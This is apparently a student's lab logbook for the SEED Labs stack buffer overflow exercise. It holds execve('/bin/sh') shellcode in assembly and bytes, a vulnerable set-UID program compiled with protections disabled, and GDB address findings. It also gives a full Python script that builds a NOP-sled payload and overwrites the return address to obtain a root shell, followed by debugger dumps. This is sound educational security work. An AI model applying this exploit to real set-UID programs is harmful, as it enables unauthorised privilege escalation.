# Logbook #5

## Task 1: Getting Familiar with Shellcode

### Step 1: The C Version of Shellcode

Making a shellcode in C would be as simple as just calling `execve()` function with the path to the shell, for example "/bin/sh"

### Step 2: 32-bit Shellcode

As the shellcode in C cannot be easily compiled, we write it directly in 32-bit assembly:

```asm
# Store the command on stack
xor eax, eax
push eax
push "//sh"
push "/bin"
mov ebx, esp # ebx --> "/bin//sh": execve()’s 1st argument
# Construct the argument array argv[]
push eax # argv[1] = 0
push ebx # argv[0] --> "/bin//sh"
mov ecx, esp # ecx --> argv[]: execve()’s 2nd argument
# For environment variable
xor edx, edx # edx = 0: execve()’s 3rd argument
# Invoke execve()
xor eax, eax 
mov al, 0x0b # execve()’s system call number
int 0x80
```

### Step 4: Invoking the Shellcode

Then, we can easily write a C program that declares an array in the stack with the 32-bit binary code of the previous step and compile it with the `execstack` option. Running that program gives the attacker access to a privileged shell:

```shell
$ gcc -m32 -z execstack -o a32.out call_shellcode.c
$ sudo chown root a32.out
$ sudo chmod 4755 a32.out
$ ./a32.out
# whoami
root
```

## Task 2: Understanding the Vulnerable Program

The stack.c program takes advantage of the buffer overflow vulnerability.

In the function `bfo(char * str)`, a buffer `buffer[BUF_SIZE]` is created and the bytes in `str` are copied to it. The vulnerability happens because the `str`  (length=517) is bigger than the buffer allocated (length=148 in the case of this group).

Compiling the code and giving it SET-UID permissions like this

```shell
$ gcc -DBUF_SIZE=148 -z execstack -fno-stack-protector -m32 -o stack-L1 stack.c
$ gcc -DBUF_SIZE=148 -z execstack -fno-stack-protector -m32 -g -o stack-L1-dbg stack.c
$ sudo chown root stack-L1 && sudo chmod 4755 stack-L1
```

creates an executable capable of executing potentially malicious code written in the file given as argument.

## Task 3: Launching Attack on 32-bit Program (Level 1)

### Step 1: Investigation

Using GDB to get the frame pointer's value and the buffer's address.

```shell
gdb-peda$ b bof
Breakpoint 1 at 0x12ad: file stack.c, line 16.
gdb-peda$ run
gdb-peda$ n
gdb-peda$ p $ebp
$1 = (void *) 0xffffcb08
gdb-peda$ p &buffer
$2 = (char (*)[148]) 0xffffca6c
```

Frame Pointer: **0xffffcb08**  
Address of buffer: **0xffffca6c**

### Step 2: Launching Attacks

```python
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
        "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
        "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))

##################################################################
# Put the shellcode somewhere in the payload
start = 517 - len(shellcode) # [1]
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0xFFFFCA6C + start # [2]
offset = (0xFFFFCB08 - 0xFFFFCA6C) + 4 # [3]

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
##################################################################

# Write the content to a file
with open(’badfile’, ’wb’) as f:
	f.write(content)
```

The shellcode is the assembly code provided by SEEDLabs.

The start variable \[1\] will be the position in the file where we put the shellcode. We chose to put it in the end of the file, ie, in the stack, it will be written to `&buffer + 517 - len(shellcode)` .

When the `bof()` function returns, it should start executing our shellcode. So, its return address value should be modified to `&buffer + start` \[2\].

The position of the `bof()` return address can be easily calculated with the expression at \[3\]. Since we know that the return address of a function is at `ebp + 4` , we just need to calculate the location of the `ebp` relative to `&buffer` , which is the difference between the two `(0xFFFFCB08 - 0xFFFFCA6C)` .

---

## Question 2

Below are the states of the program before and after the badfile contents are placed in the stack.

It is worth noting that:

- The EBP and EAX pointers reference a NOOP;
- The stack is populated with NOOPs and the shell code provided.


- strcpy();

  ```
  [----------------------------------registers-----------------------------------]
  EAX: 0x56558fb8 --> 0x3ec0 
  EBX: 0x56558fb8 --> 0x3ec0 
  ECX: 0x60 ('`')
  EDX: 0xffffcf10 --> 0xf7fb4000 --> 0x1e6d6c 
  ESI: 0xf7fb4000 --> 0x1e6d6c 
  EDI: 0xf7fb4000 --> 0x1e6d6c 
  EBP: 0xffffcb08 --> 0xffffcf18 --> 0xffffd148 --> 0x0 
  ESP: 0xffffca60 --> 0x0 
  EIP: 0x565562c5 (<bof+24>:	sub    esp,0x8)
  EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
  [-------------------------------------code-------------------------------------]
     0x565562b5 <bof+8>:	sub    esp,0xa4
     0x565562bb <bof+14>:	call   0x565563fd <__x86.get_pc_thunk.ax>
     0x565562c0 <bof+19>:	add    eax,0x2cf8
  => 0x565562c5 <bof+24>:	sub    esp,0x8
     0x565562c8 <bof+27>:	push   DWORD PTR [ebp+0x8]
     0x565562cb <bof+30>:	lea    edx,[ebp-0x9c]
     0x565562d1 <bof+36>:	push   edx
     0x565562d2 <bof+37>:	mov    ebx,eax
  [------------------------------------stack-------------------------------------]
  0000| 0xffffca60 --> 0x0 
  0004| 0xffffca64 --> 0x0 
  0008| 0xffffca68 --> 0xf7fb4f20 --> 0x0 
  0012| 0xffffca6c --> 0x7d4 
  0016| 0xffffca70 ("0pUV.pUV(\317\377\377")
  0020| 0xffffca74 (".pUV(\317\377\377")
  0024| 0xffffca78 --> 0xffffcf28 --> 0x205 
  0028| 0xffffca7c --> 0x0 
  [------------------------------------------------------------------------------]
  Legend: code, data, rodata, value
  20	    strcpy(buffer, str); 
  ```


- return 1;

  ```
  [----------------------------------registers-----------------------------------]
  EAX: 0xffffca6c --> 0x90909090 
  EBX: 0x56558fb8 --> 0x3ec0 
  ECX: 0xffffd130 --> 0xc031d231 
  EDX: 0xffffcc69 --> 0xc031d231 
  ESI: 0xf7fb4000 --> 0x1e6d6c 
  EDI: 0xf7fb4000 --> 0x1e6d6c 
  EBP: 0xffffcb08 --> 0x90909090 
  ESP: 0xffffca60 --> 0x0 
  EIP: 0x565562dc (<bof+47>:	mov    eax,0x1)
  EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
  [-------------------------------------code-------------------------------------]
     0x565562d2 <bof+37>:	mov    ebx,eax
     0x565562d4 <bof+39>:	call   0x56556120 <strcpy@plt>
     0x565562d9 <bof+44>:	add    esp,0x10
  => 0x565562dc <bof+47>:	mov    eax,0x1
     0x565562e1 <bof+52>:	mov    ebx,DWORD PTR [ebp-0x4]
     0x565562e4 <bof+55>:	leave  
     0x565562e5 <bof+56>:	ret    
     0x565562e6 <main>:	endbr32
  [------------------------------------stack-------------------------------------]
  0000| 0xffffca60 --> 0x0 
  0004| 0xffffca64 --> 0x0 
  0008| 0xffffca68 --> 0xf7fb4f20 --> 0x0 
  0012| 0xffffca6c --> 0x90909090 
  0016| 0xffffca70 --> 0x90909090 
  0020| 0xffffca74 --> 0x90909090 
  0024| 0xffffca78 --> 0x90909090 
  0028| 0xffffca7c --> 0x90909090 
  [------------------------------------------------------------------------------]
  Legend: code, data, rodata, value
  22	    return 1;
  ```
- A snippet of the memory region of the buffer:

  ```
  ...   
     0xffffcc54:	nop
     0xffffcc55:	nop
     0xffffcc56:	xor    eax,eax
     0xffffcc58:	push   eax
     0xffffcc59:	push   0x68732f2f
     0xffffcc5e:	push   0x6e69622f
     0xffffcc63:	mov    ebx,esp
     0xffffcc65:	push   eax
     0xffffcc66:	push   ebx
     0xffffcc67:	mov    ecx,esp
     0xffffcc69:	xor    edx,edx
     0xffffcc6b:	xor    eax,eax
     0xffffcc6d:	mov    al,0xb
     0xffffcc6f:	int    0x80
     0xffffcc71:	add    eax,0x2
  ...
  ```